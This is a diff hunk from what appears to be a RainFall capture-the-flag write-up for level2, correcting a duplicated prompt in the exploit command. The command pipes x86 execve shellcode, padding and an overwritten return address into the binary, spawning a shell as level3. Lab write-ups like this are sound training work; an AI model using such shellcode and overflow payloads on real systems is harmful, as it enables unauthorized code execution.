@@ -125,7 +125,7 @@ Lets create our exploit string:
 
 Pipe the exploit string into ./level2 stdin. This opens a shell as user ```level3```, where we can cat the level3 password.
 ```
-level2@RainFall:~$ (python -c 'print level2@RainFall:~$ (python -c 'print "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80" + "A" * 54 + "\x08\xa0\x04\x08"' ; cat -) | ./level2
+level2@RainFall:~$ (python -c 'print "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80" + "A" * 54 + "\x08\xa0\x04\x08"' ; cat -) | ./level2
 ...
 whoami
 level3
